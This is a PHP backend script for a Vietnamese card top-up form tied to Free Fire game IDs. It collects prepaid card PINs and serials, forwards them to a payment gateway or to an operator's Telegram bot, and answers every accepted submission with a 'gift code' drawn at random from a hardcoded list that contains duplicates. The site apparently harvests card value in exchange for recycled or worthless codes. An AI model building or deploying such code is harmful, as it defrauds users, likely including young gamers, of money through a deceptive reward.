<?php
// --- XỬ LÝ CHÍNH ---
require_once("../config/config.php");
require_once("../config/function.php");
require_once("../config/spam_protection.php");

$CMSNT = new CMSNT;

// 1. Chống Proxy/VPN
if (is_proxy()) {
    http_response_code(403);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Kết nối qua Proxy/VPN bị chặn để ngăn chặn spam!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// 2. Kiểm tra các tham số đầu vào cơ bản
if (!isset($_POST['id_game']) || !isset($_POST['telco']) || !isset($_POST['amount']) || !isset($_POST['pin'])) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Thiếu dữ liệu yêu cầu!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$id_game = check_string($_POST['id_game']);
$loaithe = check_string($_POST['telco']);
$menhgia = check_string($_POST['amount']);
$seri = isset($_POST['serial']) ? check_string($_POST['serial']) : '';
$pin = check_string($_POST['pin']);
$userIP = myip();

// 3. Xác thực mã chống bot (Multi-touch Token)
$antibotToken = $_POST['antibotToken'] ?? '';
if (empty($antibotToken) || !isset($_SESSION['antibot_token']) || $antibotToken !== $_SESSION['antibot_token']) {
    http_response_code(403);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Phát hiện hành vi tự động (Bot). Giao dịch bị từ chối!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// 4. Xác thực Cloudflare Turnstile Captcha
if ($CMSNT->site('enable_turnstile_captcha') == 1) {
    $cloudflareToken = $_POST['cloudflareToken'] ?? '';
    $turnstileRes = verify_turnstile($cloudflareToken, $secrec_key_cf, $userIP);
    if (!$turnstileRes['success']) {
        // Tái tạo phép toán để trả về phép toán mới khi lỗi
        $_SESSION['math_captcha_num1'] = rand(1, 9);
        $_SESSION['math_captcha_num2'] = rand(1, 9);
        $_SESSION['math_captcha_answer'] = $_SESSION['math_captcha_num1'] + $_SESSION['math_captcha_num2'];
        
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'msg' => 'Xác thực Captcha Turnstile không hợp lệ. Vui lòng thử lại!',
            'new_math' => $_SESSION['math_captcha_num1'] . ' + ' . $_SESSION['math_captcha_num2'] . ' = ?'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// 4.1. Xác thực Captcha dạng ảnh (Local GD Image)
if ($CMSNT->site('enable_image_captcha') == 1) {
    $image_captcha = isset($_POST['image_captcha']) ? strtolower(trim($_POST['image_captcha'])) : '';
    $saved_captcha = isset($_SESSION['image_captcha']) ? strtolower(trim($_SESSION['image_captcha'])) : '';
    if (empty($image_captcha) || $image_captcha !== $saved_captcha) {
        $_SESSION['math_captcha_num1'] = rand(1, 9);
        $_SESSION['math_captcha_num2'] = rand(1, 9);
        $_SESSION['math_captcha_answer'] = $_SESSION['math_captcha_num1'] + $_SESSION['math_captcha_num2'];
        
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'msg' => 'Mã xác nhận bằng ảnh không đúng!',
            'new_math' => $_SESSION['math_captcha_num1'] . ' + ' . $_SESSION['math_captcha_num2'] . ' = ?'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// 4.2. Xác thực Captcha dạng tính toán (Math Challenge)
if ($CMSNT->site('enable_math_captcha') == 1) {
    $math_captcha = isset($_POST['math_captcha']) ? trim($_POST['math_captcha']) : '';
    $saved_answer = isset($_SESSION['math_captcha_answer']) ? $_SESSION['math_captcha_answer'] : null;
    if (empty($math_captcha) || $math_captcha != $saved_answer) {
        $_SESSION['math_captcha_num1'] = rand(1, 9);
        $_SESSION['math_captcha_num2'] = rand(1, 9);
        $_SESSION['math_captcha_answer'] = $_SESSION['math_captcha_num1'] + $_SESSION['math_captcha_num2'];
        
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'msg' => 'Đáp án phép tính xác nhận không đúng!',
            'new_math' => $_SESSION['math_captcha_num1'] . ' + ' . $_SESSION['math_captcha_num2'] . ' = ?'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// 4.3. Xác thực Captcha dạng mảnh ghép (Puzzle Slider)
if ($CMSNT->site('enable_puzzle_captcha') == 1) {
    if (!isset($_SESSION['puzzle_verified']) || $_SESSION['puzzle_verified'] !== true) {
        $_SESSION['math_captcha_num1'] = rand(1, 9);
        $_SESSION['math_captcha_num2'] = rand(1, 9);
        $_SESSION['math_captcha_answer'] = $_SESSION['math_captcha_num1'] + $_SESSION['math_captcha_num2'];
        
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'msg' => 'Vui lòng hoàn thành kéo thả mảnh ghép xác nhận!',
            'new_math' => $_SESSION['math_captcha_num1'] . ' + ' . $_SESSION['math_captcha_num2'] . ' = ?'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
    // Hủy trạng thái xác thực sau khi sử dụng để chống replay attack
    unset($_SESSION['puzzle_verified']);
}

// 5. Kiểm tra định dạng ID Game, PIN, Serial (Anti SQL-Injection & Logic validation)
if (!preg_match('/^\d{9,12}$/', $id_game)) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'msg' => 'ID Game Free Fire phải là số, từ 9 đến 12 ký tự!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if (!preg_match('/^\d{6,30}$/', $pin)) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Mã thẻ/PIN không đúng định dạng!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($loaithe !== 'Garena') {
    if (!preg_match('/^\d{5,25}$/', $seri)) {
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'msg' => 'Số Serial không đúng định dạng!'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// 6. Kiểm tra Dấu vân tay trình duyệt (Fingerprint) & Rate Limiting
$fingerprint = check_string($_POST['fingerprint'] ?? '');
if (empty($fingerprint) || !preg_match('/^[a-f0-9]{32}$/i', $fingerprint)) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Dấu vân tay trình duyệt không hợp lệ!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// Giới hạn nạp thẻ: Tối đa 3 lần / 5 phút trên cùng 1 trình duyệt (Fingerprint)
$five_minutes_ago = date('Y-m-d H:i:s', time() - 300);
$attempts = $CMSNT->num_rows("SELECT * FROM `napthe` WHERE `fingerprint` = '$fingerprint' AND `created_at` >= '$five_minutes_ago'");
if ($attempts !== false && $attempts >= 3) {
    http_response_code(429);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Bạn đã nạp thẻ quá nhanh (Giới hạn 3 lần/5 phút). Vui lòng đợi thêm!'
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

// ========================================
// TIẾP TỤC XỬ LÝ NẠP THẺ & LƯU DB
// ========================================
$giftcodes = [
    "6KWMFJVMQQYG", "8HOEWF23DR4Z00G", "DY49FEF3KLRSD4E", "EYH2W3XK8UPG", "FFSJEURYFH6GBDNE",
    "96Y4CNBZGV35", "BR43FMAPYEZZ", "FHNSJUA65RQ2FDCV", "FJI4U5HYTNFJKC8U", "FYTGFVAQ2U34Y6TR",
    "HNC95435FAGJ", "JS15VZSSCTZPZPPN", "FFCMCPSEN5MX", "FFCMCPSGC9XZ", "FFCMCPSJ99S3",
    "F3BERNFJUCYTSRAF", "F4J5TGY6TGSBN34J", "F5M6NMYKHGIO867U", "F6HGGFBCNJ3NRTGR", "F7YTGE45NTJKIGUJ",
    "FF10617KGUF9", "FF11NJN5YS3E", "FFCMCPSUYUY7E", "KAOWPC94NDOVJB24", "O5BLTPRLFMSNDF09",
    "XUYKRG4732GJJJZ", "NETK35KF32MML8E", "DY49FEF3KLRSD4E", "JS15VZSSCTZPZPPN", "8HOEWF23DR4Z00G",
    "XEZEYO05JJGOVZ9Z", "96Y4CNBZGV35", "Q4QU4GQGE5KD", "TFF9VNU6UD9J", "MQJWNBVHYAQM",
    "RRQ3SSJTN9UK", "WCMERVCMUSZ9", "FFICJGW9NKYT", "FFAC2YXE6RF2", "3IBBMSL7AK8G",
    "B3G7A22TWDR7X", "EYH2W3XK8UPG", "FFCMCPSJ99S3", "FFCO8BS5JW2D", "FF9MJ31CXKRG",
    "OB98-7FD6-E5TR", "G5B6-NY3M-KU8H", "JON9-8B7V-FY6D", "87YD-G2TE-B4RJ", "5TYO-1H9J-I8NU",
    "F3U4-756T-GB8C", "PCNF5CQBAJLK", "XUW3FNK7AV8N", "FFBBCVQZ4MWA", "FFCMCPSBN9CU",
    "HHNAT6VKQ9R7", "2FG94YCW9VMV", "HFNSJ6W74Z48", "E2F86ZREMK49", "TDK4JWN6RD6", "XFW4Z6Q882WY"
];

$card_approval_mode = $CMSNT->site('card_approval_mode') ?: 'manual';
$code = random('qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM', 12);

// Đầu tiên, chèn thẻ vào cơ sở dữ liệu với trạng thái chờ duyệt (status = 0)
$isInsert = $CMSNT->insert("napthe", [
    'request_id' => $code,
    'id_game' => $id_game,
    'telco' => $loaithe,
    'amount' => (int)$menhgia,
    'thucnhan' => 0,
    'serial' => $seri,
    'code' => $pin, // Pin được lưu ở cột code theo thiết kế của admin panel
    'status' => 0, // Chờ duyệt
    'ip' => $userIP,
    'fingerprint' => $fingerprint
]);

if (!$isInsert) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'msg' => 'Không lưu được giao dịch vào hệ thống. Vui lòng thử lại!',
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($card_approval_mode === 'auto') {
    // ----------------------------------------
    // CẤU HÌNH NẠP TỰ ĐỘNG - ĐẨY LÊN CỔNG
    // ----------------------------------------
    $active_gateway = $CMSNT->site('active_card_gateway') ?: 'doithe1s';
    
    // Nạp thư viện Gateway Factory
    require_once(__DIR__ . "/../config/gateways/GatewayFactory.php");
    
    try {
        $gateway = GatewayFactory::create($active_gateway);
        $res = $gateway->processCard([
            'telco' => $loaithe,
            'pin' => $pin,
            'serial' => $seri,
            'amount' => (int)$menhgia,
            'request_id' => $code
        ]);
        
        if ($res['success']) {
            // Cập nhật trạng thái thành Đang xử lý tự động (status = 99)
            $CMSNT->update("napthe", ['status' => 99], "`request_id` = '$code'");
            
            $_SESSION['antibot_token'] = bin2hex(random_bytes(16));
            echo json_encode([
                'status' => 'success',
                'msg' => 'Gửi thẻ tự động thành công! Đang chờ duyệt. Mã quà tặng của bạn: ' . $giftcodes[array_rand($giftcodes)]
            ], JSON_UNESCAPED_UNICODE);
        } else {
            // Cập nhật trạng thái thành Thất bại (status = 2) và ghi nhận lý do lỗi
            $CMSNT->update("napthe", ['status' => 2], "`request_id` = '$code'");
            echo json_encode([
                'status' => 'error',
                'msg' => 'Gửi thẻ tự động thất bại: ' . $res['message']
            ], JSON_UNESCAPED_UNICODE);
        }
    } catch (Exception $e) {
        $CMSNT->update("napthe", ['status' => 2], "`request_id` = '$code'");
        echo json_encode([
            'status' => 'error',
            'msg' => 'Lỗi kết nối cổng tự động: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    }
    exit;
} else {
    // ----------------------------------------
    // CẤU HÌNH NẠP CHẬM - CHỜ DUYỆT THỦ CÔNG
    // ----------------------------------------
    // Gửi thông báo đến Telegram Bot
    $telegram_message = "🔔 <b>YÊU CẦU NẠP CHẬM MỚI!</b>\n";
    $telegram_message .= "------------------------------------\n";
    $telegram_message .= "📱 <b>Loại thẻ:</b> " . strtoupper($loaithe) . "\n";
    $telegram_message .= "💰 <b>Mệnh giá:</b> " . number_format($menhgia) . " VND\n";
    $telegram_message .= "🔑 <b>Mã thẻ (PIN):</b> <code>" . $pin . "</code>\n";
    $telegram_message .= "📜 <b>Số seri:</b> <code>" . $seri . "</code>\n";
    $telegram_message .= "🎯 <b>ID Game:</b> " . $id_game . "\n";
    $telegram_message .= "🆔 <b>Mã giao dịch:</b> <code>" . $code . "</code>\n";
    $telegram_message .= "🌐 <b>Địa chỉ IP:</b> " . $userIP . "\n";
    $telegram_message .= "⏰ <b>Thời gian:</b> " . date('Y-m-d H:i:s') . "\n";
    $telegram_message .= "------------------------------------\n";
    $telegram_message .= "👉 Truy cập trang admin để duyệt thẻ.";
    
    send_telegram_notification($telegram_message);

    $_SESSION['antibot_token'] = bin2hex(random_bytes(16));
    echo json_encode([
        'status' => 'success',
        'msg' => 'Gửi thẻ thành công! Hệ thống đang chờ kiểm tra. Mã quà tặng của bạn: ' . $giftcodes[array_rand($giftcodes)]
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

exit;
?>